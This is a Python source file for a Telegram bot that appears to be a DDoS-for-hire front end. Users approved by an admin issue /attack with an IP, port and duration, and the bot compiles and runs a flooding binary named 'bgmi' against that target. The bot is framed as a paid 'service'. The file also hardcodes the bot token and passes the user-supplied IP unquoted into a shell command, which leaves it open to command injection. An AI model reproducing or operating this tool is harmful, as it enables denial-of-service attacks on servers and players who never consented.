import asyncio
import os
import signal
import subprocess
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext

TELEGRAM_BOT_TOKEN = '8605400191:AAF4MaZvG_5MUSCnQBJkwCBU7gOhSvxv9Rs'
ADMIN_USER_ID = 8422824412
USERS_FILE = 'users.txt'
attack_in_progress = False

def load_users():
    try:
        with open(USERS_FILE, 'r') as f:
            return set(line.strip() for line in f if line.strip())
    except FileNotFoundError:
        return set()

def save_users(users):
    with open(USERS_FILE, 'w') as f:
        f.writelines(f"{user}\n" for user in users)

users = load_users()

async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = (
        "*🔥 Welcome to the battlefield! 🔥*\n\n"
        "*Use /attack <ip> <port> <duration>*\n"
        "*Let the war begin! ⚔️💥*"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def manage(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    args = context.args

    if update.effective_user.id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You need admin approval to use this command.*", parse_mode='Markdown')
        return

    if len(args) != 2:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /manage <add|rem> <user_id>*", parse_mode='Markdown')
        return

    command, target_user_id = args
    target_user_id = target_user_id.strip()

    if command == 'add':
        users.add(target_user_id)
        save_users(users)
        await context.bot.send_message(chat_id=chat_id, text=f"*✔️ User {target_user_id} added.*", parse_mode='Markdown')
    elif command == 'rem':
        users.discard(target_user_id)
        save_users(users)
        await context.bot.send_message(chat_id=chat_id, text=f"*✔️ User {target_user_id} removed.*", parse_mode='Markdown')
    else:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Invalid command. Use 'add' or 'rem'*", parse_mode='Markdown')

async def run_attack(chat_id, ip, port, duration, context):
    global attack_in_progress
    attack_in_progress = True

    try:
        # Make sure binary is executable
        if not os.path.exists('./bgmi'):
            await context.bot.send_message(chat_id=chat_id, text="*⚠️ Attack binary not found!*", parse_mode='Markdown')
            return
        
        os.chmod('./bgmi', 0o755)
        
        # Run the attack
        process = await asyncio.create_subprocess_shell(
            f"./bgmi {ip} {port} {duration} 10",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        
        # Wait for completion with timeout
        try:
            stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=duration + 30)
            if stdout:
                print(f"[stdout]\n{stdout.decode()}")
            if stderr:
                print(f"[stderr]\n{stderr.decode()}")
        except asyncio.TimeoutError:
            process.kill()
            await context.bot.send_message(chat_id=chat_id, text="*⚠️ Attack timed out!*", parse_mode='Markdown')

    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error: {str(e)}*", parse_mode='Markdown')

    finally:
        attack_in_progress = False
        await context.bot.send_message(chat_id=chat_id, text="*✅ Attack Completed! ✅*\n*Thank you for using our service!*", parse_mode='Markdown')

async def attack(update: Update, context: CallbackContext):
    global attack_in_progress

    chat_id = update.effective_chat.id
    user_id = str(update.effective_user.id)
    args = context.args

    if user_id not in users:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You need to be approved to use this bot.*", parse_mode='Markdown')
        return

    if attack_in_progress:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Another attack is already in progress. Please wait.*", parse_mode='Markdown')
        return

    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /attack <ip> <port> <duration>*", parse_mode='Markdown')
        return

    ip, port, duration = args
    
    # Validate inputs
    try:
        port = int(port)
        duration = int(duration)
        if duration > 300:
            await context.bot.send_message(chat_id=chat_id, text="*⚠️ Maximum duration is 300 seconds!*", parse_mode='Markdown')
            return
        if port < 1 or port > 65535:
            await context.bot.send_message(chat_id=chat_id, text="*⚠️ Invalid port number!*", parse_mode='Markdown')
            return
    except ValueError:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Port and duration must be numbers!*", parse_mode='Markdown')
        return

    await context.bot.send_message(chat_id=chat_id, text=(
        f"*⚔️ Attack Launched! ⚔️*\n"
        f"*🎯 Target: {ip}:{port}*\n"
        f"*🕒 Duration: {duration} seconds*\n"
        f"*🔥 Mayhem initiated! Let the battlefield ignite! 💥*"
    ), parse_mode='Markdown')

    asyncio.create_task(run_attack(chat_id, ip, str(port), str(duration), context))

async def status(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    if attack_in_progress:
        await context.bot.send_message(chat_id=chat_id, text="*⚔️ Attack is currently in progress! ⚔️*", parse_mode='Markdown')
    else:
        await context.bot.send_message(chat_id=chat_id, text="*💤 No attack in progress. Use /attack to start!*", parse_mode='Markdown')

def main():
    # Compile bgmi.c if needed
    if os.path.exists('bgmi.c') and not os.path.exists('bgmi'):
        os.system('gcc -pthread -o bgmi bgmi.c')
        os.chmod('bgmi', 0o755)
    
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("manage", manage))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("status", status))
    
    print("🤖 BGMI Attack Bot is running...")
    application.run_polling()

if __name__ == '__main__':
    main()
